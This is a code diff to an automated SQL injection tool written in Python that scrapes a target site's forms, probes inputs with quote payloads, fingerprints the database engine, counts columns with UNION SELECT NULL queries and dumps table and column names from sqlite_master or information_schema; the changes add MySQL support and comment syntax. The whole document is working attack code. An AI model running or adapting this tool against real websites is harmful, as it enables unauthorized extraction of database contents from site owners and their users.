@@ -15,10 +15,16 @@ args = parser.parse_args()
 entrypoints = [ "'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
 
 tables = {
-	"sqlite": "FROM sqlite_master"
+	"sqlite": "FROM sqlite_master",
+	"mysql": "FROM information_schema.tables", 
 }
 infos = {
-	"sqlite": ["name", "sql"] # sql for colums, name for tables
+	"sqlite": ["name", "sql"], # sql for colums, name for tables
+	"mysql": ["table_name", "column_name"]
+}
+comments = {
+	"sqlite": "--",
+	"mysql": "#",
 }
 # data[input_tag["name"]] = "' UNION SELECT sql, name FROM sqlite_master --"
 
@@ -28,10 +34,10 @@ def make_request(injectable_input, form_details, payload, method):
 	for input_tag in form_details["inputs"]:
 		if input_tag["type"] != "submit" and input_tag["name"] != injectable_input:
 			data[input_tag["name"]] = "eXaMpl34Tst"
+	data[form_details["inputs"][-1]["name"]] = form_details["inputs"][-1]["value"]
 	if method == "POST":
-		return requests.post(args.url, data=data)
-	url_encoded_data = urlencode(data)
-	return requests.get(f"{args.url}?{url_encoded_data}")
+		return requests.post(form_details["action"], data=data)
+	return requests.get(form_details["action"], params=data)
 
 
 
@@ -61,16 +67,17 @@ def detect_database_engine(form_details, method):
 				res = make_request(input_tag["name"], form_details, payload, method)
 				diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
 				engine = detect_error(diff)
+				# print(res.text.splitlines(keepends=True))
 			if engine != "Unknown" and input_tag["name"] != None:
 				working.append([engine, payload, input_tag["name"]])
 	return working
 
 
-def detect_number_of_columns(input, form_details, working, method):
+def detect_number_of_columns(input, form_details, working, engine, method):
 	columns = "NULL"
 	nb_colums = 1
 	while nb_colums > 0 and nb_colums < 20:
-		res = make_request(input, form_details, f"{working} UNION SELECT {columns} --", method)
+		res = make_request(input, form_details, f"{working} UNION SELECT {columns} {comments[engine]}", method)
 		diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
 		error = detect_error(diff)
 		if error == "Unknown":
@@ -85,7 +92,7 @@ def dump_database(input, working, form_details, nb_columns, engine):
 	while count < nb_columns:
 		insert += ",NULL"
 		count += 1
-	res = make_request(input, form_details, f"{working} UNION SELECT {insert} {tables[engine]} --", "POST")
+	res = make_request(input, form_details, f"{working} UNION SELECT {insert} {tables[engine]} {comments[engine]}", "POST")
 	diff = diff_html(page.text.splitlines(keepends=True), res.text.splitlines(keepends=True))
 	return diff
 
@@ -95,15 +102,18 @@ if __name__ == "__main__":
 	forms = get_all_forms(args.url)
 	for form in forms:
 		form_details = get_form_details(form)
+		if form_details["action"].startswith('http'):
+			form_details['action'] = form_details['action']
+		else:
+			form_details['action'] = args.url + form_details['action']
 		if (form_details["method"].lower() != args.X.lower()):
 			continue
-		print(form_details)
 		payload_working = detect_database_engine(form_details, args.X)
 		if payload_working == []:
 			print("No SQL injection found")
 			exit(0)
 		for payload in payload_working:
-			columns = detect_number_of_columns(payload[2], form_details, payload[1], args.X)
+			columns = detect_number_of_columns(payload[2], form_details, payload[1], payload[0],args.X)
 			print("PAYLOAD USED: ", payload[1])
 			print("VULNERABLE PARAMETER: ", payload[2])
 			print("ENGINE: ", payload[0])
